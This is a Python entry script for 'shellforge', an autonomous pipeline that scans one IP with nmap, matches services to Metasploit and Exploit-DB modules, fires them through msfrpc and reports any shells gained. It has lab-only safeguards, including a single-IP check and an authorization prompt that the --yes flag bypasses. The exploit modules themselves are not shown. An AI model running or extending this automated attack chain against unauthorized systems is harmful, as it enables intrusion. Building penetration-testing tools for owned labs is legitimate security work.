#!/usr/bin/env python3
"""shellforge -- autonomous lab-only exploitation pipeline.

Given a SINGLE target IP, shellforge runs recon -> match -> dry-run -> fire ->
verify -> report, driving tools that are already installed on Kali (nmap,
searchsploit, Metasploit via msfrpc).

AUTHORIZED LAB USE ONLY. shellforge enforces this at the tool level:

* exactly one IP address (no CIDR, ranges, lists or input files),
* an explicit interactive authorization prompt that is logged,
* no hardcoded targets and no internet-facing scan mode,
* Ctrl+C stops immediately and cleans up sessions it opened.
"""

from __future__ import annotations

import argparse
import ipaddress
import logging
import signal
import sys
from datetime import datetime
from pathlib import Path

import yaml

from core import executor as execmod
from core import matcher, recon, reporter

LOG = logging.getLogger("shellforge")

BANNER = r"""
  _          _ _  __
 | |__  __ _| | |/ _|___ _ _ __ _ ___
 | '_ \/ _` | | |  _/ _ \ '_/ _` / -_)
 |_.__/\__,_|_|_|_| \___/_| \__, \___|   shellforge
                            |___/        authorized lab use only
"""


def setup_logging(target: str, reports_dir: Path) -> None:
    """Configure logging to both stdout and a per-run logfile."""
    reports_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    logfile = reports_dir / f"shellforge_{target.replace(':', '_')}_{ts}.log"
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler(logfile, encoding="utf-8"),
        ],
    )
    LOG.info("Logging to %s", logfile)


def validate_single_ip(value: str) -> str:
    """Accept exactly one IP address. Reject CIDR, ranges, lists, files.

    Raises:
        argparse.ArgumentTypeError: On anything that is not a single IP.
    """
    raw = value.strip()
    for bad, label in (("/", "CIDR"), (",", "list"), (" ", "list"), ("-", "range")):
        if bad in raw:
            raise argparse.ArgumentTypeError(
                f"--target must be a single IP address; {label} input ('{raw}') "
                "is not allowed. shellforge is a single-host, lab-only tool."
            )
    try:
        ip = ipaddress.ip_address(raw)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(
            f"'{raw}' is not a valid IP address: {exc}"
        ) from exc
    return str(ip)


def load_config(path: str | Path) -> dict:
    """Load YAML config, or exit with a hint if it is missing."""
    p = Path(path)
    if not p.exists():
        print(
            f"[!] Config '{p}' not found. Copy the template first:\n"
            f"      cp config.yaml.example {p}\n",
            file=sys.stderr,
        )
        sys.exit(2)
    with p.open("r", encoding="utf-8") as fh:
        return yaml.safe_load(fh) or {}


def confirm_authorization(target: str, assume_yes: bool = False) -> bool:
    """Interactive authorization gate. Returns True only on explicit 'y'."""
    question = (
        f"\n[?] Is {target} a lab you own or have WRITTEN permission to test? [y/N] "
    )
    if assume_yes:
        LOG.warning("Authorization auto-confirmed via --yes for target %s", target)
        print(question + "y (via --yes)")
        return True
    try:
        answer = input(question).strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        return False
    granted = answer == "y"
    LOG.info("Authorization prompt for %s -> %s", target, "GRANTED" if granted else "DENIED")
    return granted


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="shellforge",
        description="Autonomous lab-only exploitation pipeline (single target).",
        epilog="AUTHORIZED LAB USE ONLY. You are responsible for having permission.",
    )
    parser.add_argument(
        "--target",
        required=True,
        type=validate_single_ip,
        help="A single target IP address (no CIDR/range/list/file).",
    )
    parser.add_argument(
        "--config",
        default="config.yaml",
        help="Path to the YAML config file (default: config.yaml).",
    )
    parser.add_argument(
        "--yes",
        action="store_true",
        help="Pre-confirm the authorization prompt (for unattended lab runs). "
        "The confirmation is still logged.",
    )
    args = parser.parse_args(argv)

    config = load_config(args.config)
    reports_dir = Path("reports")
    setup_logging(args.target, reports_dir)

    print(BANNER)
    LOG.info("Target: %s", args.target)

    # --- Authorization gate -------------------------------------------------
    if not confirm_authorization(args.target, assume_yes=args.yes):
        LOG.warning("Authorization not granted. Exiting without scanning.")
        print("[!] Authorization not granted. Nothing was scanned. Exiting.")
        return 1

    the_executor: execmod.Executor | None = None

    def handle_sigint(signum, frame):  # noqa: ANN001 - signal handler signature
        LOG.warning("Ctrl+C received -- stopping and cleaning up.")
        print("\n[!] Interrupted. Cleaning up sessions shellforge opened...")
        if the_executor is not None:
            the_executor.cleanup()
        sys.exit(130)

    signal.signal(signal.SIGINT, handle_sigint)

    recon_result = None
    matches: list = []
    attempts: list = []

    try:
        # --- 1. RECON -------------------------------------------------------
        recon_cfg = config.get("recon", {})
        recon_result = recon.run_recon(
            target=args.target,
            nmap_arguments=recon_cfg.get("nmap_arguments", "-sV -Pn"),
            timeout=int(recon_cfg.get("timeout", 300)),
            reports_dir=reports_dir,
        )
        open_services = recon_result.open_services()
        if not open_services:
            print("[!] No open services found. Nothing to do.")
            _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
            return 0

        # --- 2. CONNECT + MATCH --------------------------------------------
        msf_cfg = config.get("msfrpc", {})
        client = execmod.connect(
            host=msf_cfg.get("host", "127.0.0.1"),
            port=int(msf_cfg.get("port", 55553)),
            user=msf_cfg.get("user", "msf"),
            password=msf_cfg.get("password", "msf"),
            ssl=bool(msf_cfg.get("ssl", True)),
        )

        matches = matcher.match_services(
            open_services,
            msf_client=client,
            use_searchsploit=config.get("searchsploit", {}).get("enabled", True),
        )
        candidates = matcher.flatten_candidates(matches)
        if not candidates:
            print("[!] No actionable Metasploit candidates found. See report for Exploit-DB hits.")
            _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
            return 0

        print(f"[*] {len(candidates)} candidate module(s) queued (most reliable first).")

        # --- 3-5. DRY-RUN + FIRE + VERIFY ----------------------------------
        the_executor = execmod.Executor(client, args.target, config)
        attempts = the_executor.run(candidates)

    except execmod.MsfConnectionError as exc:
        LOG.error("%s", exc)
        print(f"\n[!] {exc}")
        _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
        return 3
    except Exception as exc:  # noqa: BLE001 - top-level guard
        LOG.exception("Unexpected error: %s", exc)
        print(f"[!] Unexpected error: {exc}")
        _finalize(args.target, True, recon_result, matches, attempts, reports_dir)
        return 1

    # --- 6. REPORT ----------------------------------------------------------
    json_path, md_path = _finalize(args.target, True, recon_result, matches, attempts, reports_dir)

    succeeded = any(getattr(a, "success", False) for a in attempts)
    if succeeded:
        print("\n[+] SHELL OBTAINED. See report for session details and proof.")
    else:
        print("\n[-] No shell obtained. All candidates exhausted.")
    print(f"[*] JSON report: {json_path}")
    print(f"[*] MD report:   {md_path}")
    return 0 if succeeded else 4


def _finalize(target, consent, recon_result, matches, attempts, reports_dir):
    """Build and write reports; return the two paths (or empty strings)."""
    if recon_result is None:
        return "", ""
    report = reporter.build_report(target, consent, recon_result, matches, attempts)
    return reporter.write_reports(report, reports_dir)


if __name__ == "__main__":
    raise SystemExit(main())
